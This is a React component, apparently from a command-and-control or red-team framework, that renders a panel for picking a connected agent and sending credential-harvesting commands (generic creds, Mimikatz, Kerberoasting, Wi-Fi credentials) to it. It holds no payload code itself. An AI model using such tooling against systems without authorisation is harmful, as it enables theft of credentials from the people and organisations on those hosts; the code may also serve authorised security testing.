"use client";

import { useCallback, useEffect, useState } from "react";
import { api } from "@/lib/api";
import { paths } from "@/lib/api-paths";
import { useI18n } from "@/lib/i18n";
import { toast } from "sonner";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { normalizeAgentList } from "@/lib/agents";
import {
  CRED_HARVEST_ACTIONS,
  credActionAllowed,
  credActionBlockReason,
  hasMimikatzModule,
  parseModuleNames,
  type CredActionQuality,
} from "./cred-quality";

function QualityMark({ quality }: { quality: CredActionQuality }) {
  const { t } = useI18n();
  if (quality === "hardened") return <>{t("cred.quality_hardened")}</>;
  if (quality === "experimental") return <>{t("cred.quality_experimental")}</>;
  if (quality === "core") return <>{t("cred.quality_core")}</>;
  return <>{t("cred.quality_scripted")}</>;
}

function harvestLabel(action: string, t: (k: string) => string): string {
  if (action === "creds") return t("cred.harvest_creds");
  if (action === "mimikatz") return t("cred.harvest_mimikatz");
  if (action === "kerberoast") return t("cred.harvest_kerberoast");
  if (action === "wifi_creds") return t("cred.harvest_wifi");
  return action;
}

export function CredHarvestCard() {
  const { t } = useI18n();
  const [agents, setAgents] = useState<Array<{ id: string; hostname: string; status?: string }>>([]);
  const [agentId, setAgentId] = useState("");
  const [hasModule, setHasModule] = useState(false);
  const [busy, setBusy] = useState<string | null>(null);

  const load = useCallback(async () => {
    try {
      const [modRes, agentRes] = await Promise.all([
        api.get(paths.modules.list),
        api.get(paths.agents.list("page=1&pageSize=50")),
      ]);
      setHasModule(hasMimikatzModule(parseModuleNames(modRes)));
      const list = normalizeAgentList(agentRes).map((a) => ({
        id: String(a.id || ""),
        hostname: String(a.hostname || a.id || ""),
        status: a.status,
      })).filter((a) => a.id);
      setAgents(list);
      setAgentId((prev) => prev || list.find((a) => a.status === "online")?.id || list[0]?.id || "");
    } catch {
      setHasModule(false);
    }
  }, []);

  useEffect(() => { void load(); }, [load]);

  const harvest = async (action: string) => {
    if (!agentId) {
      toast.error(t("cred.harvest_need_agent"));
      return;
    }
    if (credActionBlockReason(action, hasModule) === "missing_module") {
      toast.error(t("cred.missing_module"));
      return;
    }
    const def = CRED_HARVEST_ACTIONS.find((a) => a.action === action);
    if (!def?.endpoint) return;
    setBusy(action);
    try {
      await api.post(paths.agents.cmd(agentId, def.endpoint), {});
      toast.success(t("cred.harvest_sent"));
    } catch (err) {
      toast.error(err instanceof Error ? err.message : t("cred.harvest_failed"));
    } finally {
      setBusy(null);
    }
  };

  return (
    <Card className="p-(--card-spacing) mb-6">
      <div className="mb-3">
        <div className="text-sm font-semibold">{t("cred.harvest_title")}</div>
        <p className="text-xs text-muted-foreground mt-0.5">{t("cred.harvest_hint")}</p>
      </div>
      <div className="flex flex-wrap items-end gap-3">
        <div className="min-w-[200px]">
          <span className="mb-1.5 block text-xs font-semibold text-muted-foreground">{t("cred.harvest_agent")}</span>
          <Select value={agentId} onValueChange={(v) => v != null && setAgentId(v)}>
            <SelectTrigger className="w-full">
              <SelectValue placeholder={t("cred.harvest_need_agent")} />
            </SelectTrigger>
            <SelectContent>
              {agents.map((a) => (
                <SelectItem key={a.id} value={a.id}>{a.hostname} ({a.status || "?"})</SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>
        <div className="flex flex-wrap gap-2">
          {CRED_HARVEST_ACTIONS.map((a) => {
            const blocked = credActionBlockReason(a.action, hasModule) === "missing_module";
            const allowed = credActionAllowed(a.action, hasModule);
            return (
              <Button
                key={a.action}
                type="button"
                variant="outline"
                size="sm"
                disabled={!agentId || !allowed || busy !== null}
                title={blocked ? t("cred.missing_module") : undefined}
                onClick={() => { void harvest(a.action); }}
                className="h-auto flex-col items-start gap-0.5 px-3 py-2"
              >
                <span>{harvestLabel(a.action, t)}</span>
                <span className="text-(--fs-micro) font-normal text-muted-foreground">
                  <QualityMark quality={a.quality} />
                </span>
              </Button>
            );
          })}
        </div>
      </div>
      {!hasModule && (
        <p className="mt-3 text-xs text-warning">
          {t("cred.missing_module")}
        </p>
      )}
      {hasModule && (
        <Badge variant="outline" className="mt-3 text-(--fs-micro-sm)">{t("cred.module_ready")}</Badge>
      )}
    </Card>
  );
}
